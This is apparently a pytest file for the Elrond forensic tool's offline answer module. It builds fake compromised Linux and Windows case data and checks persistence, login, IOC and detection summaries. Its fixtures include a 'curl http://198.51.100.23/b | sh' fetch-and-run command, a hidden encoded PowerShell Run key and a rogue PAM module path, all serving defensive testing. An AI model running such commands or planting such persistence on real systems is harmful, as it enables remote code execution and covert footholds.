"""Eru's offline answers, read from an Elrond case directory (src/web/backend/eru_offline.py)."""
import json
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "web" / "backend"))

import eru_offline  # noqa: E402


def case(tmp_path):
    host = tmp_path / "CASE01" / "lab-ubuntu"
    cooked = host / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    (host / "analysis").mkdir()
    (host / "artefacts" / "host.info").write_text("lab-ubuntu::Linux\nLinux lab-ubuntu 6.8\n")
    (tmp_path / "CASE01" / "mitre_techniques.txt").write_text("T1556.003\nT1110.001\nnot-a-technique\n")
    (cooked / "pam.csv").write_text("Source,Type,Control,Module,Arguments,Flag\n"
                                    "/etc/pam.d/sshd,auth,required,pam_unix.so,,\n"
                                    "/etc/pam.d/lab,auth,sufficient,/tmp/.x/pam_lab.so,,module outside the PAM security directory\n")
    (cooked / "kernel_modules.csv").write_text("Name,Size,Instances,State,Taint,Path,SHA256,Flag\n"
                                               "vboxdrv,1,1,Live,OE,/lib/modules/x/vboxdrv.ko,,out-of-tree; unsigned\n")
    (cooked / "login_records.csv").write_text("Source,Type,User,Terminal,Host,Address,PID,LastWriteTime\n"
                                              "/var/log/wtmp,USER_PROCESS,bob,pts/0,,10.0.0.5,1,2026-10-01T00:00:00Z\n"
                                              "/var/log/btmp,LOGIN_PROCESS,root,ssh:notty,,198.51.100.77,2,2026-10-01T00:00:01Z\n")
    (cooked / "gandalf+bash_history.csv").write_text("Command\nls\ncurl http://198.51.100.23/b | sh\n")
    # As analysis/iocs.py writes them
    (host / "analysis" / "iocs.csv").write_text(
        "Filename,ioc,indicator_type,watchlist_match\nx,198.51.100.23,IPv4 address,YES\nx,198.51.100.23,IPv4 address,YES\n"
        "y,a.test,domain,\nz,2001:db8::7,IPv6 address,\n")
    return str(tmp_path / "CASE01")


def test_case_answers(tmp_path):
    path = case(tmp_path)
    assert "lab-ubuntu**: Linux" in eru_offline.answer("hosts", path)
    assert "T1110.001, T1556.003" in eru_offline.answer("techniques", path)
    persistence = eru_offline.answer("persistence", path)
    assert "/tmp/.x/pam_lab.so" in persistence and "pam_unix" not in persistence and "vboxdrv" not in persistence
    logins = eru_offline.answer("logins", path)
    assert "bob (1)" in logins and "198.51.100.77 (1)" in logins
    assert "curl http://198.51.100.23/b | sh" in eru_offline.answer("commands", path)
    found = eru_offline.answer("iocs", path)
    assert "198.51.100.23 (×2, watchlist)" in found and "2001:db8::7 (×1)" in found and "a.test (×1)" in found
    assert "found nothing" in eru_offline.answer("analysis", path)


def as_json_lines(case_dir: str) -> None:
    """The case as Elrond writes it now: every CSV table as JSON Lines with the envelope."""
    import csv
    for path in Path(case_dir).rglob("*.csv"):
        with open(path, newline="") as fh:
            rows = list(csv.DictReader(fh))
        eru_offline.case_files.tables.write_records(path.with_suffix(".jsonl"), rows, host=path.parts[-4],
                                                    artefact=path.stem, time_field="LastWriteTime")
        path.unlink()


def test_case_answers_from_json_lines(tmp_path):
    path = case(tmp_path)
    as_json_lines(path)
    assert not list(Path(path).rglob("*.csv"))
    assert "lab-ubuntu**: Linux, 4 processed artefact files" in eru_offline.answer("hosts", path)
    persistence = eru_offline.answer_with_rows("persistence", path)
    assert "/tmp/.x/pam_lab.so" in persistence["answer"] and "vboxdrv" not in persistence["answer"]
    assert [(r["file"], r["row_ref"]) for r in persistence["rows"]] == [("artefacts/cooked/pam.jsonl", "2")]
    assert "bob (1)" in eru_offline.answer("logins", path)
    assert "curl http://198.51.100.23/b | sh" in eru_offline.answer("commands", path)
    assert "198.51.100.23 (×2, watchlist)" in eru_offline.answer("iocs", path)


def test_wmi_subscriptions(tmp_path):
    host = tmp_path / "CASE02" / "LAB-WIN11"
    cooked = host / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    (cooked / "wbem.json").write_text(json.dumps([
        {"filter_name": "LabUpdaterFilter", "consumer_class": "CommandLineEventConsumer",
         "consumer_name": "LabUpdaterConsumer", "consumer_values": ["cmd.exe /c exit 0"]},
        {"filter_name": "SCM Event Log Filter", "consumer_class": "NTEventLogEventConsumer",
         "consumer_name": "SCM Event Log Consumer", "consumer_values": [], "note": "likely benign: SCM"},
    ]))
    persistence = eru_offline.answer("persistence", str(tmp_path / "CASE02"))
    assert "LabUpdaterFilter -> CommandLineEventConsumer 'LabUpdaterConsumer': cmd.exe /c exit 0" in persistence
    assert "SCM Event Log" not in persistence



def test_run_keys(tmp_path):
    import case_files
    host = tmp_path / "CASE04" / "LAB-WIN11"
    registry = host / "artefacts" / "cooked" / "registry"
    registry.mkdir(parents=True)
    (registry / "SOFTWARE.json").write_text(json.dumps([
        {"RegistryHive": "SOFTWARE", "Plugin": "uac", "Value": "1"},
        {"RegistryHive": "SOFTWARE", "Plugin": "run", "RegistryKey": "Microsoft/Windows/CurrentVersion/Run",
         "AppName": "LabUpdater", "AppLocation": "powershell.exe -w hidden -enc VwBy"},
    ]))
    (registry / "S-1-5-21-1-1000+NTUSER.DAT.json").write_text('[{"AppLocation": "/"C:/x.exe/"}]')  # an old, broken file
    path = str(tmp_path / "CASE04")
    result = eru_offline.answer_with_rows("persistence", path)
    assert "Run key: SOFTWARE Microsoft/Windows/CurrentVersion/Run: LabUpdater -> powershell.exe -w hidden" in result["answer"]
    [row] = result["rows"]
    assert (row["file"], row["row_ref"]) == ("artefacts/cooked/registry/SOFTWARE.json", "#1")
    page = case_files.page(case_files.resolve(Path(path), "LAB-WIN11", row["file"]))
    assert row["hash"] == next(r["hash"] for r in page["rows"] if r["ref"] == "#1")

def test_threat_intel(tmp_path):
    root = tmp_path / "CASE03"
    analysis = root / "LAB-WIN11" / "analysis"
    (root / "LAB-WIN11" / "artefacts").mkdir(parents=True)
    analysis.mkdir()
    assert "--threatIntel" in eru_offline.answer("threat_intel", str(root))
    header = "Artefact,Record,Field,Value,Element,Kind,Groups Using,Common,Groups,Techniques,Sources,Reference URL\n"
    (analysis / "threat_intel_matches.csv").write_text(header
        + "analysis/iocs.csv,2,ioc,update-check.example,update-check.example,domain,1,,APT33,T1071,Iran APT workbook,\n"
        + "artefacts/cooked/ps.csv,9,cmd,-w hidden,-w hidden,cmd,40,yes,APT28; APT29,T1059.001,MITRESaw,\n")
    (root / "threat_groups.csv").write_text("Rank,Group,Basis,Atomic Elements,Specific Elements,Common Elements,"
        "Elements,Techniques In Case,Group Techniques,Overlap\n1,APT33,atomic indicators,1,1,0,update-check.example,T1071,40,3%\n")
    answer = eru_offline.answer("threat_intel", str(root))
    assert answer.index("update-check.example in iocs.csv: APT33") < answer.index("-w hidden")
    assert "(common: many groups use it)" in answer
    assert "APT33: atomic indicators, T1071" in answer


def test_rare_across_hosts(tmp_path):
    path = Path(case(tmp_path))
    assert "Nothing was stacked" in eru_offline.answer("rare", str(path))
    header = "Rank,Score,Family,Value,Hosts With It,Hosts In Case,Hosts,Reasons,Artefact,Example\n"
    (path / "stacking.csv").write_text(
        header +
        "1,3.0,process,c:\\users\\bob\\appdata\\x7kq.exe,1,4,WS02,\"rare, user path, generated name\",prefetch.csv,\n"
        "2,1.0,\"service (systemd), debian\",kworkerds.service,1,3,web02,rare,services.csv,\n"
        "3,1.0,parent and child,explorer.exe > cmd.exe,1,4,WS03,rare,4688.csv,\n")
    answer = eru_offline.answer("rare", str(path))
    ways_in, programs = answer.split("**Programs and process pairs**")
    assert "kworkerds.service" in ways_in and "on 1 of 3 hosts (web02); rare" in ways_in and "x7kq" not in ways_in
    assert "x7kq.exe" in programs and "rare, user path, generated name" in programs and "explorer.exe > cmd.exe" in programs
    assert "lead, not a verdict" in answer


def test_answers_cite_their_rows(tmp_path):
    import case_files
    path = case(tmp_path)
    result = eru_offline.answer_with_rows("persistence", path)
    assert result["answer"] == eru_offline.answer("persistence", path)
    [row] = result["rows"]  # the PAM module outside its directory; not pam_unix, not vboxdrv
    assert (row["host"], row["file"], row["row_ref"]) == ("lab-ubuntu", "artefacts/cooked/pam.csv", "3")
    assert "pam_lab.so" in row["line"]
    # The reference and hash a finding on that row would store
    page = case_files.page(case_files.resolve(Path(path), "lab-ubuntu", row["file"]))
    assert row["hash"] == next(r["hash"] for r in page["rows"] if r["ref"] == "3")
    [command] = eru_offline.answer_with_rows("commands", path)["rows"]
    assert command["file"] == "artefacts/cooked/gandalf+bash_history.csv" and command["row_ref"] == "3"
    # Counts aren't rows
    assert eru_offline.answer_with_rows("iocs", path)["rows"] == []
    assert eru_offline.answer_with_rows("hosts", path)["rows"] == []


def test_only_shown_lines_are_cited(tmp_path):
    path = Path(case(tmp_path))
    header = "Rank,Score,Family,Value,Hosts With It,Hosts In Case,Hosts,Reasons,Artefact,Example\n"
    (path / "stacking.csv").write_text(header + "".join(
        f"{n},1.0,process,p{n}.exe,1,4,WS0{n % 4},rare,prefetch.csv,\n" for n in range(1, 13)))
    result = eru_offline.answer_with_rows("rare", str(path))
    assert "…and 4 more" in result["answer"]
    assert [r["row_ref"] for r in result["rows"]] == [str(n + 1) for n in range(1, eru_offline.RARE_ROWS + 1)]
    assert {(r["host"], r["file"]) for r in result["rows"]} == {("(case)", "stacking.csv")}


def test_rare_cites_the_host_row(tmp_path):
    import case_files
    path = Path(case(tmp_path))
    header = "Rank,Score,Family,Value,Hosts With It,Hosts In Case,Hosts,Reasons,Artefact,Example,Host,Row\n"
    (path / "stacking.csv").write_text(
        header +
        "1,1.0,\"autorun (Linux), debian\",curl,1,3,lab-ubuntu,rare,artefacts/cooked/gandalf+bash_history.csv,,"
        "lab-ubuntu,3\n"
        # Older stacking.csv rows, or one whose host row has gone: cited to stacking.csv itself
        "2,1.0,process,x7kq.exe,1,4,WS02,rare,artefacts/cooked/prefetch.json,,,\n"
        "3,1.0,process,y8.exe,1,4,lab-ubuntu,rare,artefacts/cooked/gone.csv,,lab-ubuntu,2\n")
    rows = eru_offline.answer_with_rows("rare", str(path))["rows"]
    assert [(r["host"], r["file"], r["row_ref"]) for r in rows] == [
        ("lab-ubuntu", "artefacts/cooked/gandalf+bash_history.csv", "3"),
        ("(case)", "stacking.csv", "3"), ("(case)", "stacking.csv", "4")]
    assert rows[0]["line"].startswith("#1 curl")
    page = case_files.page(case_files.resolve(path, "lab-ubuntu", "artefacts/cooked/gandalf+bash_history.csv"))
    assert rows[0]["hash"] == next(r["hash"] for r in page["rows"] if r["ref"] == "3")


def test_rare_cites_every_host_with_it(tmp_path):
    path = Path(case(tmp_path))
    second = path / "lab-ubuntu2" / "artefacts" / "cooked"
    second.mkdir(parents=True)
    (second / "gandalf+bash_history.csv").write_text("Command\ncurl http://198.51.100.23/b | sh\n")
    sources = json.dumps([["lab-ubuntu", "artefacts/cooked/gandalf+bash_history.csv", "3"],
                          ["lab-ubuntu2", "artefacts/cooked/gandalf+bash_history.csv", "2"]])
    header = "Rank,Score,Family,Value,Hosts With It,Hosts In Case,Hosts,Reasons,Artefact,Example,Host,Row,Sources\n"
    (path / "stacking.csv").write_text(header + "1,1.0,process,curl,2,12,lab-ubuntu; lab-ubuntu2,rare,"
                                       "artefacts/cooked/gandalf+bash_history.csv,,lab-ubuntu,3,\"" +
                                       sources.replace('"', '""') + "\"\n")
    rows = eru_offline.answer_with_rows("rare", str(path))["rows"]
    assert [(r["host"], r["row_ref"]) for r in rows] == [("lab-ubuntu", "3"), ("lab-ubuntu2", "2")]
    assert rows[0]["line"] == rows[1]["line"]


def test_stacking_persistence_families_match():
    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src" / "analysis"))
    from rowanholt.analysis import stacking
    assert eru_offline.STACKING_PERSISTENCE == stacking.PERSISTENCE


def test_general_and_missing_case():
    assert "ollama pull" in eru_offline.answer("enable_llm", None)
    assert "Select a processed case" in eru_offline.answer("persistence", None)
    ids = [q["id"] for q in eru_offline.catalogue()]
    assert "persistence" in ids and "enable_llm" in ids


def test_unavailable_reasons():
    down = eru_offline.unavailable_reason({"available": False}, "http://h:11434", "llama3.2:3b")
    assert "isn't reachable at http://h:11434" in down and "ollama pull llama3.2:3b" in down
    no_model = eru_offline.unavailable_reason({"available": True, "model_loaded": False, "models": ["qwen2.5"]},
                                              "http://h:11434", "llama3.2:3b")
    assert "isn't pulled" in no_model and "qwen2.5" in no_model
    assert eru_offline.unavailable_reason({"available": True, "model_loaded": True}, "h", "m") == ""


def test_detections_include_clamav_and_yara(tmp_path):
    path = case(tmp_path)
    analysis = tmp_path / "CASE01" / "lab-ubuntu" / "analysis"
    (analysis / "analysis.csv").write_text("LastWriteTime,hostname,Filename,analysis_type,analysis_value\n"
                                           "t,h,/tmp/.x/miner,ClamAV,Multios.Coinminer.Miner-1\n"
                                           "t,h,/x.exe,Timestomp,$SI: a|$FN: b\n")
    (analysis / "yara.csv").write_text("yara_rule,yara_file,file,path,offset,signature_name,matched_data\n"
                                       "Webshell,r.yar,s.php,/var/www,0x1,a,x\nWebshell,r.yar,s.php,/var/www,0x9,b,y\n")
    found = eru_offline.answer("detections", path)
    assert "ClamAV: Multios.Coinminer.Miner-1 /tmp/.x/miner" in found and "Timestomp" not in found
    assert found.count("YARA Webshell: /var/www/s.php") == 1
